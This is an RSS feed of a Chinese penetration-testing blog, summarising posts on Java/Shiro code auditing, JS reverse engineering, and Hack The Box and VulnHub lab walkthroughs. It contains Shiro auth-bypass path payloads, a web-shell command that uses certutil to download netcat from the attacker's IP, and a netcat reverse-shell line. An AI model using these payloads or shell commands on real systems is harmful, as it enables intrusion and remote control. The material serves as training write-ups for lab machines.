<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Posts on 养猪日记</title>
    <link>https://yangzhuzai.github.io/posts/</link>
    <description>Recent content in Posts on 养猪日记</description>
    <image>
      <title>养猪日记</title>
      <url>https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- 0.135.0</generator>
    <language>en</language>
    <lastBuildDate>Thu, 19 Dec 2024 14:25:59 +0800</lastBuildDate>
    <atom:link href="https://yangzhuzai.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>代码审计总结</title>
      <link>https://yangzhuzai.github.io/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</link>
      <pubDate>Thu, 19 Dec 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;
&lt;p&gt;Java安全是一个比较庞大的东西，单论Java代码审计所需要的知识点其实较为简单，Java安全研究会比较深入，其实可以这两者可以较为明显的区分开来，一个为了业务服务，一个为了深入挖掘。单论安全服务以及渗透测试的程度，业务层面的Java代码审计足以。如果是要深入研究的话，愚见认为，不同的岗位决定对知识的掌握深度，当前岗位如果有深入需求再考虑。以下文章内容仅从快速完成代码审计的视角出发，不涉及深入的漏洞研究。&lt;/p&gt;
&lt;h1 id=&#34;常见组件漏洞&#34;&gt;常见组件漏洞&lt;/h1&gt;
&lt;h2 id=&#34;1shiro&#34;&gt;1、Shiro&lt;/h2&gt;
&lt;p&gt;shiro的漏洞主要是两个，一个是硬编码，一个是权限绕过：&lt;/p&gt;
&lt;h3 id=&#34;硬编码&#34;&gt;硬编码：&lt;/h3&gt;
&lt;p&gt;硬编码漏洞大家都知道问题出在rememberMe功能上，对于shiro而言，配置rememberMe的方法大致如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;securityManager.setRememberMeManager(rememberMeManager());//设置rememberMeManager()

关键词：setRememberMeManager

具体实现：
public CookieRememberMeManager rememberMeManager()  
{  
    CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();  
    cookieRememberMeManager.setCookie(rememberMeCookie());  
    cookieRememberMeManager.setCipherKey(Base64.decode(&amp;#34;fCq+/xW488hMTCD+cmJ3aQ==&amp;#34;));  
    return cookieRememberMeManager;  
}

搜索密钥关键词：setCipherKey

shiro还可以通过配置文件的方式进行配置，同样可以搜索关键词：
org.apache.shiro.web.mgt.DefaultWebSecurityManager
org.apache.shiro.web.mgt.CookieRememberMeManager
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;案例：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/dmsj_img/Pasted%20image%2020241210212625.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/dmsj_img/Pasted%20image%2020241210212644.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/dmsj_img/Pasted%20image%2020241210212700.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/dmsj_img/Pasted%20image%2020241210212952.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h3 id=&#34;权限绕过&#34;&gt;权限绕过：&lt;/h3&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;CVE&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;描述&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;影响范围&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;payload&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-1957&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;权限绕过&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Shiro &amp;lt; 1.5.2&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/xxx/..;/admin/&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-11989&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-1957补丁绕过&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Shiro &amp;lt; 1.5.3&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/;/admin/page&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-13933&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-11989补丁绕过&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Shiro &amp;lt; 1.6.0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/admin/%3bpage&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-17523&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;权限绕过&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Shiro &amp;lt; 1.7.1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/admin/%20  &lt;!-- raw HTML omitted --&gt;/admin/%2e&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;shiro配置路径匿名访问的方法大概如下：&lt;/p&gt;</description>
    </item>
    <item>
      <title>001 JS逆向</title>
      <link>https://yangzhuzai.github.io/posts/skill/001-js%E9%80%86%E5%90%91/</link>
      <pubDate>Fri, 18 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/skill/001-js%E9%80%86%E5%90%91/</guid>
      <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;
&lt;p&gt;实战渗透项目很多时候都能遇到数据包加密的情况，很多时候会觉得棘手，因为很多改包的动作无法实现，但是这样不完全是坏处，特别是一些参数加密的时候，由于数据包加密，所以他们天然存在WAF绕过，将我们的payload加入JS加密的文本中传输，WAF几乎很难识别。&lt;/p&gt;
&lt;p&gt;目前有两种解决方案，一种是扣JS代码，获取所有的加密函数，中间很容易遇到函数嵌套，陷入扣代码的困局，还有一种是JS-RPC的解决方案，详情可以参考：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://xz.aliyun.com/t/14629?time__1311=GqAhYK0KBKAIP05DKBOxmODRrzc6LK%3D63x#toc-2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;JS-RPC，详情查看使用方式配合上文食用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/jxhczhl/JsRpc
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单记录一些遇到的网站，以及如何配合burp插件，方便我们进行渗透：&lt;/p&gt;
&lt;h1 id=&#34;一常规扣代码解密&#34;&gt;一、常规扣代码解密&lt;/h1&gt;
&lt;p&gt;返回数据包中带有encrypt_data：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/skills_img/WEBRESOURCE06fb036892c213ea424de433727ff58bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;浏览器ctrl+shift+f搜索encrypt_data，找到对应的JS代码文件，找到符合要求的，必须为某方法，全部包含该参数的，而非只取某个值，打上断点可以看URL是否正确，以及参数是否对应：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/skills_img/WEBRESOURCEce73a6a38d5282da884652c227096b51image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;控制台再次确认参数是否找正确了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/skills_img/WEBRESOURCE3359011f28caf526691da6e5769de273image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;源码里面点进去，找到相关函数：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/skills_img/WEBRESOURCEbfa2c9d9cd97a6475566dd72c44bc67bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;把相关的内容放到本地进行调试：&lt;/p&gt;
&lt;p&gt;这里出现错误，W未定义：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/skills_img/WEBRESOURCE1d3417e238773a0070ce8234a73d1150image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;把W也复制过来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/skills_img/WEBRESOURCE839694b9468a1ab934fb75653f1abc39image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;继续把J也复制过来，中间还会遇到好几个函数缺失，都复制过来即可：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/skills_img/WEBRESOURCE639721e284de5468f2153dc055aa0959image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里就算是逆向完成了，接下来就要做代码层面的嵌入了，用python的execjs库即可：&lt;/p&gt;
&lt;p&gt;pip install pyexecjs2&lt;/p&gt;
&lt;p&gt;demo01.py&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import requests
import execjs

headers = {
    &amp;#39;accept&amp;#39;: &amp;#39;application/json, text/plain, */*&amp;#39;,
    &amp;#39;accept-language&amp;#39;: &amp;#39;zh-CN&amp;#39;,
    &amp;#39;cache-control&amp;#39;: &amp;#39;no-cache&amp;#39;,
    &amp;#39;content-type&amp;#39;: &amp;#39;application/x-www-form-urlencoded&amp;#39;,
    &amp;#39;origin&amp;#39;: &amp;#39;https://rxxx&amp;#39;,
    &amp;#39;pragma&amp;#39;: &amp;#39;no-cache&amp;#39;,
    &amp;#39;priority&amp;#39;: &amp;#39;u=1, i&amp;#39;,
    &amp;#39;referer&amp;#39;: &amp;#39;https://xxx/&amp;#39;,
    &amp;#39;sec-fetch-dest&amp;#39;: &amp;#39;empty&amp;#39;,
    &amp;#39;sec-fetch-mode&amp;#39;: &amp;#39;cors&amp;#39;,
    &amp;#39;sec-fetch-site&amp;#39;: &amp;#39;cross-site&amp;#39;,
    &amp;#39;user-agent&amp;#39;: &amp;#39;Mozilla/5.0Â\xa0(compatible;Â\xa0Baiduspider-render/2.0;Â\xa0+http://www.baidu.com/search/spider.html)&amp;#39;,
}

data = {
    &amp;#39;page&amp;#39;: &amp;#39;1&amp;#39;,
    &amp;#39;num&amp;#39;: &amp;#39;8&amp;#39;,
    &amp;#39;type&amp;#39;: &amp;#39;榜单&amp;#39;,
}

response = requests.post(&amp;#39;https://xxxn/web/webSiteCaNews&amp;#39;, headers=headers, data=data)
encrypt_data= response.json()[&amp;#39;encrypt_data&amp;#39;]
print(encrypt_data)

decrypt = execjs.compile(open(&amp;#39;./demo01.js&amp;#39;, &amp;#39;r&amp;#39;, encoding=&amp;#39;utf-8&amp;#39;).read()).call(&amp;#39;Z&amp;#39;,encrypt_data)
print(decrypt)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;demo01.js&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X000 HTB windows靶机总结</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x000-htb-windows%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x000-htb-windows%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;p&gt;个人打靶经历，不追求完美，只是记录，早些记录较为粗糙，见谅。&lt;/p&gt;
&lt;h1 id=&#34;0x001bastard--中等-非域&#34;&gt;0x001：Bastard  中等 非域&lt;/h1&gt;
&lt;p&gt;渗透路线：drupal web漏洞&amp;ndash;&amp;gt;fuzz端点&amp;ndash;&amp;gt;修改poc&amp;ndash;&amp;gt;getshell&amp;ndash;&amp;gt;提权使用winpeass&amp;ndash;&amp;gt;ms15-051&lt;/p&gt;
&lt;p&gt;考点：drupal漏洞信息查找、fuzz的理解、poc理解和使用&lt;/p&gt;
&lt;h1 id=&#34;0x002arctic-简单-非域&#34;&gt;0x002：Arctic 简单 非域&lt;/h1&gt;
&lt;p&gt;渗透思路：端口扫描无果&amp;ndash;&amp;gt;http访问&amp;ndash;&amp;gt;发现adobe coldfusion&amp;ndash;&amp;gt;漏洞信息查找&amp;ndash;&amp;gt;漏洞利用getshgell&amp;ndash;&amp;gt;提权使用winpeass&amp;ndash;&amp;gt;ms16-032&lt;/p&gt;
&lt;p&gt;考点：较为简单，思路常规，正常渗透即可完成&lt;/p&gt;
&lt;h1 id=&#34;0x003devel-简单-非域&#34;&gt;0x003：Devel 简单 非域&lt;/h1&gt;
&lt;p&gt;渗透思路：FTP匿名登录&amp;ndash;&amp;gt;发现web网站和匿名登录目录一致&amp;ndash;&amp;gt;生成asp木马反弹shell&amp;ndash;&amp;gt;提权使用winpeass&amp;ndash;&amp;gt;ms16-032&lt;/p&gt;
&lt;p&gt;考点：较为简单，思路常规，正常渗透即可完成&lt;/p&gt;
&lt;h1 id=&#34;0x004bastion-中等-非域&#34;&gt;0x004：Bastion 中等 非域&lt;/h1&gt;
&lt;p&gt;渗透思路：smb匿名访问&amp;ndash;&amp;gt;windows image backup &amp;ndash;&amp;gt;发现vhd的备份文件 &amp;ndash;&amp;gt;发现是C盘&amp;ndash;&amp;gt;导出SAM和SYSTEM文件&amp;ndash;&amp;gt;读取hash&amp;ndash;&amp;gt;破解&amp;ndash;&amp;gt;提权&lt;/p&gt;
&lt;p&gt;提权无法直接通过脚本提示，需要查找软件目录，发现非常规软件mRemoteNG&amp;mdash;&amp;gt;信息查找，发现该软件可能存在密码读取的情况&amp;ndash;&amp;gt;漏洞利用，提取administrator密码成功&lt;/p&gt;
&lt;p&gt;考点：VHD硬盘备份、sam文件读取、mRemoteNG密码提取；知识点盲区是本靶场的核心问题。&lt;/p&gt;
&lt;h1 id=&#34;0x005blue-简单-非域&#34;&gt;0x005：Blue 简单 非域&lt;/h1&gt;
&lt;p&gt;渗透思路：nmap告诉存在ms17-010&amp;ndash;&amp;gt;需要了解python如何实现ms17-010&lt;/p&gt;
&lt;p&gt;考点：在不依赖msf的情况下，如何打ms17-010&lt;/p&gt;
&lt;h1 id=&#34;0x006bounty-简单-非域&#34;&gt;0x006：Bounty 简单 非域&lt;/h1&gt;
&lt;p&gt;渗透思路：目录扫描发现上传功能&amp;ndash;&amp;gt;但是无法上传正常的后缀&amp;ndash;&amp;gt;通过fuzz发现可上传.config后缀&amp;ndash;&amp;gt;该后缀在II7.0以上可以getshell&amp;ndash;&amp;gt;提权ms16-032&lt;/p&gt;
&lt;p&gt;考点：config getshell&lt;/p&gt;
&lt;h1 id=&#34;0x007acute-困难-域渗透非常规打法&#34;&gt;0x007：Acute 困难 域渗透（非常规打法）&lt;/h1&gt;
&lt;p&gt;端口扫描：&lt;/p&gt;
&lt;p&gt;发现443 https端口，浏览器访问失效，通过证书发现域名，修改hosts文件，成功访问到了网页。&lt;/p&gt;
&lt;p&gt;web渗透：&lt;/p&gt;
&lt;p&gt;首页about us，泄露部分出名员工名称，同时有个新人表单，通过新人表单，可以发现PSWA入口以及默认密码：Password1!，以及创建者主机信息：Acute-PC01以及Lois用户是网站管理员等信息；通过泄露的员工名，拼接首字母和后面的名，使用默认密码，成功撞库PSWA，获取立足点powershell，普通权限，用户名：acute\edavies。&lt;/p&gt;
&lt;p&gt;后渗透阶段：&lt;/p&gt;
&lt;p&gt;这台靶机目前最好还是使用meterpreter，完全避免使用meterpreter的话，会花费巨量时间，以及部分功能可能无法通过脚本实现。&lt;/p&gt;
&lt;p&gt;后渗透-横向移动阶段1：&lt;/p&gt;
&lt;p&gt;通过查看当前的远程登录会话，可以发现目前的用户acute\edavies是使用了RDP的，使用meterpreter的屏幕监控功能，查看当前用户的操作，发现了另外一台主机名为：ATSSERVER，以及一个相关凭证：密码：W3_4R3_th3_f0rce.用户：acute\imonks，使用powershell，申请凭证，获取到ATSSERVER普通权限，可以拿到第一个user.txt，同时使用这个用户可以发现Program Files目录下有个keepmeon目录，是用户安装的，非常规软件目录，但是当前\imonks用户没有权限进入。&lt;/p&gt;
&lt;p&gt;后渗透-横向移动阶段2：&lt;/p&gt;
&lt;p&gt;在第一个user.txt的附近有主机Acute-PC01的脚本信息，虽然密码进行了加密，但是可以修改脚本达到命令执行的效果，反弹一个脚本内用户的权限为：acute\jmorgan，属于本地管理员用户组，也就是说我们拿到了Acute-PC01主机的管理员权限。&lt;/p&gt;
&lt;p&gt;后渗透-横向移动阶段3：&lt;/p&gt;
&lt;p&gt;使用Acute-PC01主机的管理员权限dumphash，拿到本地administrator的密码，但是无法登录ATSSERVER，由于我们之前拥有ATSSERVER的imonks用户，通过查看用户目录，可以知道该主机有哪些用户登录过了，使用Acute-PC01主机的密码进行喷洒，成功获取了一个名为awallace的用户。&lt;/p&gt;
&lt;p&gt;后渗透-横向移动阶段4：&lt;/p&gt;
&lt;p&gt;awallace用户可以进去keepmeon目录，这个目录下面有个bat文件，内容为计划任务，执行者为Lois，该用户是最开始告诉我们的网站管理员，同时在域内查找用户组，可以发现，site_admin用户组，该用户组属于domain admin group用户组，也就是说这个计划任务可以让我们获得域管理员组权限，利用这个BAT提权成功，即可获得ATSSERVER主机的管理员权限，拿到最终的flag.&lt;/p&gt;
&lt;p&gt;考点：1、信息收集；2、pswa；3、powershell熟练度；4、内网信息收集，密码获取；5、计划任务提权&lt;/p&gt;
&lt;p&gt;放在最后：这个靶机的打法及其非常规，最开始的信息收集便在一直挑战打靶者的思路完善程度，内网的提权和信息收集过程，更是把两个机器当成一个整体的思维在进行渗透，信息收集的程度堪称离谱，powershell的熟悉程度也是一个不小的挑战，最后的来回横跳巨爽。&lt;/p&gt;
&lt;h1 id=&#34;0x008timelapse-简单-域渗透&#34;&gt;0x008：Timelapse 简单 域渗透&lt;/h1&gt;
&lt;p&gt;渗透思路：
smb匿名访问&amp;ndash;&amp;gt;zip文件&amp;ndash;&amp;gt;破解发现pfx文件&amp;ndash;&amp;gt;再次破解&amp;ndash;&amp;gt;提取出私钥和公钥&amp;ndash;&amp;gt;wirm登录&amp;ndash;&amp;gt;提权，通过查看powershell历史记录，发现账号密码&amp;ndash;&amp;gt;发现该账号具有laps_readers组权限，可以读取administraor密码&lt;/p&gt;
&lt;p&gt;考点：1、PFX；2、laps_readers&lt;/p&gt;
&lt;h1 id=&#34;0x009streamio-中等-域渗透&#34;&gt;0x009：StreamIO 中等 域渗透&lt;/h1&gt;
&lt;p&gt;渗透思路：
web渗透&amp;ndash;&amp;gt;注意证书的域名变化&amp;ndash;&amp;gt;再次目录扫描&amp;ndash;&amp;gt;发现sql注入&amp;ndash;&amp;gt;获取网站的用户名和密码&amp;ndash;&amp;gt;通过burp爆破，成功获取到合法用户&amp;ndash;&amp;gt;进入后台，注意url存在?&amp;ndash;&amp;gt;fuzz发现debug参数&amp;ndash;&amp;gt;是个文件包含，需要使用base64带出&amp;ndash;&amp;gt;这里的思路有点非常规，爆破当前目录，发现master.php，读取它&amp;ndash;&amp;gt;发现它接收post提交的参数，并执行&amp;ndash;&amp;gt;通过文件包含，并携带参数，命令执行反弹shell&amp;ndash;&amp;gt;读取数据库账号密码&amp;ndash;&amp;gt;winrm登录&amp;ndash;&amp;gt;读取浏览器密码&amp;ndash;&amp;gt;获取到JDgodd用户权限&amp;ndash;&amp;gt;修改CORE STAFF组的拥有者为JDgodd，把自己添加到组内，并修改dacl，读取密码&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x000 前言</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x000-%E5%89%8D%E8%A8%80/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x000-%E5%89%8D%E8%A8%80/</guid>
      <description>&lt;p&gt;个人打靶经历，不追求完美，只是记录，早些记录较为粗糙，见谅。&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X001 Bastard</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x001-bastard/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x001-bastard/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描：&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb3d7a7acb7f5875803b8d77d07427b3eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE47f3572f4d6819bed9f11b147ff33718image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h2 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0adc3946b4962d062d144b04c4b91882image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4771da8485050d5158dfe97c2d6a81dcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;版本是7.54：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEacfa99ca7197578961cf197a69b65897image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;判断一下，基本能用的就这些：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd9ef537a0ef532d40abd2a39e7d78db3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;第一个遇到需要寻找一个端点，来进行渗透测试：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE361f32b7cee278d6e2397924972769e7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过gobuster发现node：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2d914653c97c19b2474e340f7c0ee87eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;对该目录接着进行扫描，发现01：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE060b2eecf0df2aa12ed8723373928449image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;访问一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE75bad0944eda4e2d29aea5db9b89368bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;点击：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE204736d39eca3b90bbe5da6e8ca0cac3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;把rest和rest_endpoint输入进去：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEde39c6c08041508ae9b3c72f521ba4e8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;执行成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4b89a0370927b80ba773bb5027f6b820image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;替换代码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1272b51816c79b770e4d253ff22071b8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;执行：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE34510262979338e66fe15a8a177eb07bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上传nc:&lt;/p&gt;
&lt;p&gt;http://10.10.10.9/cxk.php?cxk=certutil -urlcache -split -f http://10.10.16.4/nc64.exe C:\Windows\Temp\b.exe&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb8ea0f9ba79c3e54cba1450d84b8f819image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;反弹shell:&lt;/p&gt;
&lt;p&gt;start C:\Windows\Temp\b.exe -e cmd.exe 10.10.16.4 9999&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe858889d3ce85b26fab611d93873b3adimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用第二个rb的脚本也是可以的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE54d3e3046eaf9f5cabaa77e51418c19cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE42d10c5ffacaba987b93e0f00f09e691image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE71fa67f3fe83b1240de15a3f64eccc75image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ipconfig:&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x001 NullByte 1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x001-nullbyte-1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x001-nullbyte-1/</guid>
      <description>&lt;h1 id=&#34;ip发现端口扫描&#34;&gt;IP发现&amp;amp;端口扫描&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo nmap -Pn -sS -p- --min-rate 10000 192.168.154.0/24
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE51a6e0215fb9c3cebfcf5ca850a3aabd%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo nmap -Pn -sV -p 80,111,777,42557 --min-rate 10000 192.168.154.129
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1440a52bba0d13119375a35bb5d91007%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;目录扫描&#34;&gt;目录扫描&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gobuster dir -u http://192.168.154.129/ -w /usr/share/wordlists/dirb/common.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb1eb9f90b824cdd50b178a4e85082979%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
